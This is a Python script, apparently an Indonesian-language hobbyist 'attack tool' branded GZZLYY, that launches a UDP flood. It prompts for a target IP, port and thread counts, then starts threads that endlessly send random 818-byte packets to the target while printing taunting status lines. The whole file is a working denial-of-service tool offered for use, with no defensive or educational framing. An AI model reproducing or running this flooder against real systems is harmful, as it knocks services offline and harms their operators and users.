import random
import socket
import threading
import os,sys
import time

os.system("clear")
time.sleep(2)
print('''\033[1;31;40m

░██████╗░███████╗███████╗██╗░░░░░██╗░░░██╗██╗░░░██╗
██╔════╝░╚════██║╚════██║██║░░░░░╚██╗░██╔╝╚██╗░██╔╝
██║░░██╗░░░███╔═╝░░███╔═╝██║░░░░░░╚████╔╝░░╚████╔╝░
██║░░╚██╗██╔══╝░░██╔══╝░░██║░░░░░░░╚██╔╝░░░░╚██╔╝░░
╚██████╔╝███████╗███████╗███████╗░░░██║░░░░░░██║░░░
░╚═════╝░╚══════╝╚══════╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░''')
print("\033[94m")
print("••••••••••••••••••••••••")
print("TOOLS FUN")
print("SEMOGA TEMBUS!")
print("••••••••••••••••••••••••")
ip = str(input("IP TARGET:"))
port = int(input("PORT TARGET:"))
choice = str(input("GAS ATTACK(y/n):"))
times = int(input("THREADS:"))
threads = int(input(" PACKET:"))

os.system("clear")
def run():
        data = random._urandom(818)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(i +" PACKET DARI GZZLYY HAHAY..")
                except:
                        print("[X] PACKET DARI GZZLYY HAHAY..")

def run2():
        data = random._urandom(818)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +" PACKET DARI GZZLYY HAHAY..")
                except:
                        s.close()
                        print("[X] PACKET DARI GZZLYY HAHAY..")

def run3():
        data = random._urandom(818)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +" PACKET DARI GZZLYY HAHAY..")
                except:
                        s.close()
                        print("[X] PACKET DARI GZZLYY HAHAY..")

for y in range(threads):
        if choice == 'y':
                th = threading.Thread(target = run)
                th.start()
                th = threading.Thread(target = run2)
                th.start()
        else:
                th = threading.Thread(target = run3)
                th.start()

